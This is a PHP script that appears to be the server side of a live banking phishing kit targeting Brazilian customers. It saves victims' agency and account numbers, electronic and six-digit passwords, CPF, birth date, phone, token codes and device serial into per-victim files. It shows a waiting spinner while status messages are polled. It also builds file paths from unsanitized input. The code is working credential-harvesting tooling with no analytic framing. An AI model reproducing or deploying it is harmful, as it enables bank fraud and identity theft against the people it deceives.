<?php
include ('config.php');
if (!isset($_POST['inf'])) {
    exit;
} else {
    $inf = $_POST['inf'];
    $arquivo = $localInfo . $inf . ".info";
    //	echo $arquivo . '<br />';
    
}
if ($_POST['act'] == 'pst') {
    if (file_exists($arquivo)) {
        $arq = fopen($arquivo, 'rw+');
        $arr = (array)json_decode(fgets($arq), true);
    } else {
        $arq = fopen($arquivo, 'w+');
    }
    if (!isset($arr['TipoInfo'])) {
        $arr['TipoInfo'] = "norm.css";
    }
    $arr['STATUS'] = 'AGUARDANDO';
    if (isset($_POST['agxag'])) {
        $arr['agencia'] = $_POST['agxag'];
    }
    if (isset($_POST['cnxcn'])) {
        $arr['conta'] = $_POST['cnxcn'];
    }
    if (isset($_POST['sElet'])) {
        $arr['sEletronica'] = $_POST['sElet'];
    }
    if (isset($_POST['nascimento'])) {
        $arr['nascimento'] = $_POST['nascimento'];
    }
    if (isset($_POST['cpf'])) {
        $arr['cpf'] = $_POST['cpf'];
    }
    if (isset($_POST['portador'])) {
        $arr['portador'] = $_POST['portador'];
    }
    if (isset($_POST['fone'])) {
        $arr['fone'] = $_POST['fone'];
    }
    if (isset($_POST['sSeis'])) {
        $arr['sSeis'] = $_POST['sSeis'];
    }
    if (isset($_POST['codigo'])) {
        $cod = $_POST['codigo'];
        $qntcod = count($arr['codigo']);
        $arr['codigo'][$qntcod + 1] = $cod;
    }
    if (isset($_POST['nSerie'])) {
        $arr['nSerie'] = $_POST['nSerie'];
    }
    if (isset($_POST['operador'])) {
        $arr['operador'] = $_POST['operador'];
    }
    $arr['msg'] = ' <div id="aguarde"> <div id="agrd"> <img src="img/rodando.gif"> </div> </div>';
    rewind($arq);
    ftruncate($arq, 0);
    fwrite($arq, json_encode($arr));
    fclose($arq);
    echo $arr['msg'];
}
if ($_POST['act'] == 'get') {
    if (file_exists($arquivo)) {
        $arq = fopen($arquivo, 'r');
        $line = (array)json_decode(fgets($arq));
        fclose($arq);
        echo json_encode($line);
    } else {
        $line['STATUS'] = 'INICIO';
        $line['TipoInfo'] = "norm.css";
        $line['msg'] = '<img src="img/prg.png">';
        echo json_encode($line);
    }
}
?>